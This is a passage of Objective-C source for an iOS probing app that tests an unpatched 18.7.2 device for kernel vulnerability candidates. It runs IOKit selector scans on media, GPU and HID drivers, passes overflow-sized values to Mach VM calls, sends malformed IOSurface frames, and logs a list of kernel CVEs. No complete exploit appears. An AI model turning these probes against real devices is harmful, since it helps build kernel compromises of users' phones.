            NSString *cls = ioClassName(svc);
            if ([cls isEqualToString:want] ||
                [cls rangeOfString:want options:NSCaseInsensitiveSearch].location != NSNotFound) {
                found = svc;
                break;
            }
            IOObjectRelease(svc);
        }
        IOObjectRelease(iter);
        if (found == MACH_PORT_NULL) {
            logLine(@"TARGET %@ type=%u: service not found (%s)", want, targets[t].type, targets[t].why);
            continue;
        }
        io_connect_t conn = MACH_PORT_NULL;
        kr = IOServiceOpen(found, mach_task_self(), targets[t].type, &conn);
        logLine(@"TARGET %@ type=%u open -> 0x%x conn=%u (%s)",
                want, targets[t].type, kr, conn, targets[t].why);
        if (kr == KERN_SUCCESS && conn != MACH_PORT_NULL) {
            probeConnect(want, targets[t].type, conn);
            IOServiceClose(conn);
        }
        IOObjectRelease(found);
        usleep(100 * 1000);
    }
    logLine(@"=== targeted scan done ===");
}

// ---------------------------------------------------------------------------
// Mach VM edge cases
// ---------------------------------------------------------------------------

static void runMachTests(void) {
    logLine(@"=== Mach VM edge cases ===");
    mach_port_t task = mach_task_self();

    vm_address_t addr = 0;
    kern_return_t kr = vm_allocate(task, &addr, 0x4000, VM_FLAGS_ANYWHERE);
    logLine(@"vm_allocate -> 0x%x addr=0x%llx", kr, (unsigned long long)addr);

    if (addr == 0) {
        logLine(@"Mach VM: vm_allocate failed; aborting memory-entry tests");
        return;
    }
    logLine(@"Mach VM: valid base address = 0x%llx", (unsigned long long)addr);

    uint64_t sizes[] = {
        0x1000ULL,          // control: fits in the 0x4000 allocation
        0x4000ULL,          // control: exact allocation
        0x8000ULL,          // larger than the allocation
        0x100000000ULL,     // 4 GiB
        0x7fffffffffffffffULL,
        0x8000000000000000ULL,
        0xffffffffffffffffULL,
        0x0ULL,
    };
    for (size_t i = 0; i < sizeof(sizes) / sizeof(sizes[0]); i++) {
        memory_object_size_t size = (memory_object_size_t)sizes[i];
        mach_port_t object = MACH_PORT_NULL;
        crumb(@"START make_memory_entry addr=0x%llx size=0x%llx",
              (unsigned long long)addr, (unsigned long long)size);
        kr = mach_make_memory_entry_64(task, &size, (memory_object_offset_t)addr,
                                       VM_PROT_READ | VM_PROT_WRITE, &object, MACH_PORT_NULL);
        crumb(@"DONE make_memory_entry kr=0x%x object=%u size=0x%llx",
              kr, object, (unsigned long long)size);
        logLine(@"mach_make_memory_entry_64(addr=0x%llx, size=0x%llx) -> kr=0x%x object=%u size=0x%llx",
                (unsigned long long)addr, (unsigned long long)sizes[i], kr, object,
                (unsigned long long)size);
        if (object != MACH_PORT_NULL) mach_port_deallocate(task, object);
    }

    uint64_t deltas[] = {0, 1, 0x1000, 0x4000, 0x8000, 0xfffffffffffff000ULL};
    for (size_t i = 0; i < sizeof(deltas) / sizeof(deltas[0]); i++) {
        mach_vm_address_t a = addr + deltas[i];
        memory_object_size_t size = 0x4000;
        mach_port_t object = MACH_PORT_NULL;
        crumb(@"START make_memory_entry addr=0x%llx delta=0x%llx",
              (unsigned long long)addr, (unsigned long long)deltas[i]);
        kr = mach_make_memory_entry_64(task, &size, (memory_object_offset_t)a,
                                       VM_PROT_READ | VM_PROT_WRITE, &object, MACH_PORT_NULL);
        crumb(@"DONE make_memory_entry addr=0x%llx delta=0x%llx kr=0x%x object=%u",
              (unsigned long long)addr, (unsigned long long)deltas[i], kr, object);
        logLine(@"mach_make_memory_entry_64(addr=0x%llx+0x%llx, size=0x4000) -> kr=0x%x object=%u",
                (unsigned long long)addr, (unsigned long long)deltas[i], kr, object);
        if (object != MACH_PORT_NULL) mach_port_deallocate(task, object);
    }

    if (addr) {
        kr = vm_protect(task, addr, 0x4000, 0, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
        logLine(@"vm_protect(COPY) -> 0x%x", kr);
        vm_deallocate(task, addr, 0x4000);
    }
    logLine(@"=== Mach VM edge cases done ===");
}

// ---------------------------------------------------------------------------
// UI
// ---------------------------------------------------------------------------

@interface ProbeViewController : UIViewController
@property (nonatomic, strong) UIScrollView *scroll;
@property (nonatomic, strong) UIStackView *stack;
@end

@implementation ProbeViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor blackColor];

    gLogLock = [[NSLock alloc] init];
    gPendingLog = [NSMutableString new];
    gWorkQueue = dispatch_queue_create("candprobe.work", DISPATCH_QUEUE_SERIAL);
    newLogFile();

    UILabel *title = [[UILabel alloc] init];
    title.text = @"CandProbe · 18.7.2 / A12";
    title.textColor = [UIColor colorWithRed:1.0 green:0.63 blue:0.26 alpha:1.0];
    title.font = [UIFont monospacedSystemFontOfSize:20 weight:UIFontWeightBold];
    title.textAlignment = NSTextAlignmentCenter;

    gStatusLabel = [[UILabel alloc] init];
    gStatusLabel.text = @"idle";
    gStatusLabel.textColor = [UIColor lightGrayColor];
    gStatusLabel.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
    gStatusLabel.textAlignment = NSTextAlignmentCenter;
    gStatusLabel.numberOfLines = 0;

    self.scroll = [[UIScrollView alloc] init];
    self.scroll.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:self.scroll];

    self.stack = [[UIStackView alloc] init];
    self.stack.axis = UILayoutConstraintAxisVertical;
    self.stack.spacing = 8;
    self.stack.translatesAutoresizingMaskIntoConstraints = NO;
    [self.scroll addSubview:self.stack];

    [self.stack addArrangedSubview:title];
    [self.stack addArrangedSubview:gStatusLabel];

    NSArray<NSArray *> *buttons = @[
        @[@"1. Enumerate IOKit (safe)", @"btnEnum"],
        @[@"2. VT AVE overflow / negative dims", @"btnVT"],
        @[@"3. Raw AppleAVE2 open presets", @"btnAVE"],
        @[@"4. AppleAVE2 selector scan", @"btnAVESel"],
        @[@"5. Generic media/GPU/HID selector scan", @"btnScan"],
        @[@"6. Mach VM edge cases", @"btnMach"],
        @[@"7. Targeted media/GPU/ANE scan", @"btnTargeted"],
        @[@"8. VT malformed IOSurface frame", @"btnMalformed"],
        @[@"Share log", @"btnShare"],
        @[@"Clear log", @"btnClear"],
    ];
    for (NSArray *b in buttons) {
        UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
        [btn setTitle:b[0] forState:UIControlStateNormal];
        btn.titleLabel.font = [UIFont monospacedSystemFontOfSize:13 weight:UIFontWeightMedium];
        btn.backgroundColor = [UIColor colorWithWhite:0.12 alpha:1.0];
        btn.layer.cornerRadius = 6;
        btn.contentEdgeInsets = UIEdgeInsetsMake(10, 12, 10, 12);
        SEL sel = NSSelectorFromString(b[1]);
        [btn addTarget:self action:sel forControlEvents:UIControlEventTouchUpInside];
        [self.stack addArrangedSubview:btn];
    }

    gLogView = [[UITextView alloc] init];
    gLogView.backgroundColor = [UIColor colorWithWhite:0.06 alpha:1.0];
    gLogView.textColor = [UIColor colorWithRed:0.8 green:0.9 blue:0.8 alpha:1.0];
    gLogView.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    gLogView.editable = NO;
    gLogView.text = @"";
    gLogView.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:gLogView];

    [NSLayoutConstraint activateConstraints:@[
        [self.scroll.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor],
        [self.scroll.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [self.scroll.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [self.scroll.heightAnchor constraintEqualToConstant:300],
        [self.stack.topAnchor constraintEqualToAnchor:self.scroll.topAnchor],
        [self.stack.leadingAnchor constraintEqualToAnchor:self.scroll.leadingAnchor constant:10],
        [self.stack.trailingAnchor constraintEqualToAnchor:self.scroll.trailingAnchor constant:-10],
        [self.stack.bottomAnchor constraintEqualToAnchor:self.scroll.bottomAnchor],
        [self.stack.widthAnchor constraintEqualToAnchor:self.scroll.widthAnchor constant:-20],
        [gLogView.topAnchor constraintEqualToAnchor:self.scroll.bottomAnchor constant:6],
        [gLogView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [gLogView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [gLogView.bottomAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.bottomAnchor],
    ]];

    NSString *last = lastCrumb();
    if (last.length) {
        gStatusLabel.text = [NSString stringWithFormat:@"last breadcrumb: %@", last];
        logLine(@"LAST BREADCRUMB: %@", last);
    }

    [self logMatrix];
    flushPending();
}

- (void)logMatrix {
    logLine(@"CandProbe starting");
    logLine(@"device=%@ ios=%@", [[UIDevice currentDevice] model], [[UIDevice currentDevice] systemVersion]);
    logLine(@"=== 18.7.2 kernel candidate matrix (fixed in 18.7.3–18.7.10) ===");
    logLine(@"CVE-2026-64747  AVEVideoEncoder / AppleAVE2  -> app may execute code with kernel privileges");
    logLine(@"CVE-2026-64760  IOSurfaceAccelerator          -> app may leak sensitive kernel state");
    logLine(@"CVE-2026-20687  AppleJPEGDriver 7.6.9         -> app may write kernel memory (MOON)");
    logLine(@"CVE-2026-43724  Kernel                        -> app may write kernel memory");
    logLine(@"CVE-2026-28972  Kernel                        -> app may write kernel memory");
    logLine(@"CVE-2026-43778  Kernel                        -> UAF, corrupt kernel memory");
    logLine(@"CVE-2026-64749  Kernel                        -> corrupt kernel memory");
    logLine(@"CVE-2026-39868  Kernel                        -> corrupt kernel memory");
    logLine(@"CVE-2026-64717  Kernel                        -> corrupt kernel memory");
    logLine(@"CVE-2026-28943  IOHIDFamily                   -> determine kernel memory layout");
    logLine(@"CVE-2026-28868  Kernel                        -> disclose kernel memory");
    logLine(@"CVE-2026-28867  Kernel / mDNSResponder        -> leak sensitive kernel state");
    logLine(@"CVE-2026-64744  Kernel                        -> disclose kernel memory");
    logLine(@"CVE-2026-64709  Kernel                        -> disclose kernel memory");
    logLine(@"CVE-2026-43722  Kernel                        -> leak sensitive kernel state");
    logLine(@"CVE-2026-43754  Kernel                        -> leak sensitive kernel state");
    logLine(@"CVE-2026-39877  IOSkywalkFamily               -> disclose kernel memory");
    logLine(@"=== end matrix ===");
    logLine(@"log file: %@", gLogPath);
}

- (void)runOnQueue:(NSString *)name block:(void (^)(void))block {
    if (!gWorkQueue) return;
    dispatch_async(gWorkQueue, ^{
        dispatch_async(dispatch_get_main_queue(), ^{
            gStatusLabel.text = [NSString stringWithFormat:@"running: %@", name];
        });
        logLine(@"--- START %@ ---", name);
        @autoreleasepool {
            block();
        }
        logLine(@"--- END %@ ---", name);
        flushPending();
        dispatch_async(dispatch_get_main_queue(), ^{
            gStatusLabel.text = [NSString stringWithFormat:@"done: %@", name];
        });
    });
}

- (void)btnEnum {
    [self runOnQueue:@"enumerate" block:^{
        enumerateIOKit(YES);
    }];
}

- (void)btnVT {
    [self runOnQueue:@"VT AVE" block:^{
        runVTTests();
    }];
}

- (void)btnAVE {
    [self runOnQueue:@"raw AVE" block:^{
        runAVEProbes();
    }];
}

- (void)btnAVESel {
    [self runOnQueue:@"AVE selector" block:^{
        runAVESelectorScan();
    }];
}

- (void)btnScan {
    [self runOnQueue:@"generic scan" block:^{
        runGenericSelectorScan();
    }];
}

- (void)btnMach {
    [self runOnQueue:@"mach VM" block:^{
        runMachTests();
    }];
}

- (void)btnTargeted {
    [self runOnQueue:@"targeted scan" block:^{
        runTargetedScan();
    }];
}

- (void)btnMalformed {
    [self runOnQueue:@"malformed IOSurface" block:^{
        runVTMalformedSurface();
    }];
}

- (void)btnShare {
    flushPending();
    if (!gLogPath) return;
    UIActivityViewController *vc = [[UIActivityViewController alloc] initWithActivityItems:@[[NSURL fileURLWithPath:gLogPath]] applicationActivities:nil];
    [self presentViewController:vc animated:YES completion:nil];
}

- (void)btnClear {
    @synchronized (gPendingLog) { [gPendingLog setString:@""]; }
    dispatch_async(dispatch_get_main_queue(), ^{
        gLogView.text = @"";
    });
    [gLogFile closeFile];
    newLogFile();
    logLine(@"log cleared; new file: %@", gLogPath);
    flushPending();
}

@end

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.window.rootViewController = [[ProbeViewController alloc] init];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
